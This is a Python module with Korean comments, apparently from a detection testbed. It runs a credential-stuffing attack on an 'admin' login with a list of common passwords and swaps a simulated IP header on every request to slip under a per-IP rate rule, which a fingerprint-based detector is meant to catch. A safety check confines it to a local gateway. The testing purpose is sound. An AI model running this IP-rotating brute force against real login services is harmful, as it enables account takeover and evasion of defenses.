"""R2 공격: IP를 요청마다 바꿔 가며 admin에 흔한 비밀번호를 순차 대입.

- 한 IP에 실패가 몰리지 않게 매 요청 X-Sim-IP를 갈아끼운다 → R1(IP 윈도) 아래로 빠진다.
- 하지만 httpx 클라이언트 하나로 쏘니 헤더 순서·User-Agent(= 지문)는 그대로다.
  detector가 R2로 지문을 합산하면 IP가 바뀌어도 같은 주체로 묶여 차단된다(= R2 검증).

실제 공격 수행 코드다. config의 안전장치로 로컬 gateway만 때린다.
LLM 없이 정해진 순서로 움직이므로 재생 없이도 매번 같은 장면이 나온다.
"""
import httpx

from app.config import AGENT_TARGET, REQUEST_TIMEOUT_SECONDS, SIM_IP_POOL, assert_target_is_safe
from app.recorder import Recorder
from app.tools import IPRotator, http_get, http_post

LOGIN = "/api/v1/login"
TARGET_USERNAME = "admin"

# admin에 던질 흔한 비밀번호들. 실제 비번(admin123)을 섞어 둬서, R2가 꺼져 있으면 탈취까지 간다.
COMMON_PASSWORDS = [
    "password", "123456", "qwerty", "admin", "admin123",
    "root", "letmein", "admin1234", "P@ssw0rd", "1q2w3e4r",
]


def run_cred_stuff() -> dict:
    assert_target_is_safe()
    recorder = Recorder()
    recorder.write_meta(mode="cred_stuff", target=AGENT_TARGET)
    ip = IPRotator()   # 지문만 쓰고 IP는 아래에서 매 요청 직접 돌린다
    stolen = False
    blocked = 0

    with httpx.Client(base_url=AGENT_TARGET, timeout=REQUEST_TIMEOUT_SECONDS) as c:
        for i, password in enumerate(COMMON_PASSWORDS):
            sim_ip = SIM_IP_POOL[i % len(SIM_IP_POOL)]   # 매 요청 IP 교체 → R1 회피
            out = http_post(
                c, ip, LOGIN,
                f"대입: {TARGET_USERNAME}에 '{password}' (IP {sim_ip}로 바꿔 R1 회피)",
                body={"username": TARGET_USERNAME, "password": password},
                headers={"X-Sim-IP": sim_ip},
            )
            recorder.write_outcome(out)
            if out.http_status == 200:
                stolen = True
                break
            elif out.http_status == 429:
                blocked += 1

        recorder.write_outcome(http_get(c, ip, "/", "__END__"))

    recorder.write_end(
        summary=f"admin 대입 {len(COMMON_PASSWORDS)}건 · IP {len(SIM_IP_POOL)}개 순환 · 탈취 {stolen} · 차단 {blocked}건")
    return {"run_id": recorder.run_id, "target": TARGET_USERNAME, "stolen": stolen, "blocked": blocked}
